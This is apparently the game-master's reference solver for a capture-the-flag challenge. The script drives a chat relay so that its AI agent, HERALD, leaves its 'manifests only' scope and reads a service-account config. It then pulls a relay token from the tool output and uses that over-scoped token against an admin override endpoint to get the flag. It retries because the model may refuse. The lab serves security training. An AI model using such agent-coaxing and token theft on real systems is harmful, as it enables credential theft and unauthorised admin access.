#!/usr/bin/env python3
"""Overprivileged Relay reference solver (GM-only). Stdlib only.

Drives the live challenge from the PLAYER SURFACE only (no server-side imports):

  1. Open a relay session (POST /api/session on the relay console).
  2. Send one chat turn that gets HERALD to run service_status and then read_file
     the service-account conf. With show_tool_results=True the raw conf -- the
     RELAY_TOKEN included -- comes back in the turn's `tools` events.
  3. Parse the token out of that tool output.
  4. Call the FLEET ADMIN API's POST /admin/override directly with the token.
     The relay token is over-scoped (manifests:read + admin), so override
     accepts it and returns the override_key, which is the flag.
  5. With --check, compare that flag against challenge.yml.

The chat turn -- the part that coaxes HERALD out of its "manifests only" lane --
is the author's and lives in solution/ask.txt, not inlined here, so the exploit
phrasing stays one tunable file (mirrors Poisoned Telemetry's beacon.json). Any
{conf} token in ask.txt is replaced with the conf path before sending.

  python3 solution/solve.py --relay http://127.0.0.1:8080 \
                            --admin http://127.0.0.1:8081 \
                            [--ask solution/ask.txt] [--conf /etc/relay/relay.conf] \
                            [--check challenge.yml] [--tries 3]

Exit 0 only if /admin/override returned a key (and, with --check, it matches
challenge.yml). It prints the flag, so send stdout to /dev/null in a loop.
"""
import argparse
import json
import re
import sys
import time
import urllib.error
import urllib.request

FLAG_RE = re.compile(r"flag\{[^}]*\}")
TOKEN_RE = re.compile(r"rly_[0-9a-f]{8,}")


def call(url, path, body=None, session=None, bearer=None):
    data = None if body is None else json.dumps(body).encode()
    headers = {"Content-Type": "application/json"}
    if session is not None:
        headers["X-Session"] = session
    if bearer is not None:
        headers["Authorization"] = f"Bearer {bearer}"
    req = urllib.request.Request(
        url.rstrip("/") + path, data=data,
        method="POST" if body is not None else "GET", headers=headers,
    )
    try:
        with urllib.request.urlopen(req, timeout=300) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except (ValueError, AttributeError):
            return e.code, {"detail": str(e)}


def token_from_turn(reply: dict) -> str | None:
    """Pull the service token out of a chat turn: raw tool results first, then the reply text."""
    for ev in reply.get("tools", []):
        m = TOKEN_RE.search(str(ev.get("result", "")))
        if m:
            return m.group(0)
    m = TOKEN_RE.search(reply.get("reply", ""))
    return m.group(0) if m else None


def solve_once(relay, admin, ask, conf):
    status, s = call(relay, "/api/session", body={})
    if status != 200:
        return None, f"session failed: {status} {s}"
    session = s["session"]
    status, reply = call(relay, "/api/chat", body={"message": ask.replace("{conf}", conf)},
                         session=session)
    if status != 200:
        return None, f"chat failed: {status} {reply}"
    token = token_from_turn(reply)
    if not token:
        return None, f"no token in HERALD's reply/tools (reply={reply.get('reply', '')[:120]!r})"
    status, out = call(admin, "/admin/override", body={}, bearer=token)
    if status != 200:
        return None, f"override rejected: {status} {out}"
    key = out.get("override_key", "")
    if not key:
        return None, f"override ok but no key: {out}"
    return key, f"token {token[:12]}... accepted as {out.get('principal')}"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--relay", default="http://127.0.0.1:8080", help="relay console base URL")
    ap.add_argument("--admin", default="http://127.0.0.1:8081", help="fleet admin API base URL")
    ap.add_argument("--ask", default=None, help="file with the chat turn (default solution/ask.txt)")
    ap.add_argument("--conf", default="/etc/relay/relay.conf", help="conf path substituted for {conf}")
    ap.add_argument("--check", default=None, help="challenge.yml to match the recovered flag against")
    ap.add_argument("--tries", type=int, default=3, help="attempts (the model may refuse a read)")
    args = ap.parse_args()

    ask_path = args.ask or __file__.rsplit("/", 1)[0] + "/ask.txt"
    with open(ask_path) as f:
        ask = f.read().strip()

    flag, note = None, ""
    for i in range(1, args.tries + 1):
        flag, note = solve_once(args.relay, args.admin, ask, args.conf)
        print(f"try {i}/{args.tries}: {note}", file=sys.stderr)
        if flag:
            break
        time.sleep(2)
    if not flag:
        print("FAIL: no override key recovered", file=sys.stderr)
        sys.exit(1)

    print(flag)
    if args.check:
        with open(args.check) as f:
            want = FLAG_RE.search(f.read())
        if not want:
            print("WARN: no flag{...} in --check file (injected at deploy?)", file=sys.stderr)
        elif want.group(0) != flag:
            print(f"MISMATCH: challenge.yml has {want.group(0)}", file=sys.stderr)
            sys.exit(2)
        else:
            print("OK: matches challenge.yml", file=sys.stderr)


if __name__ == "__main__":
    main()
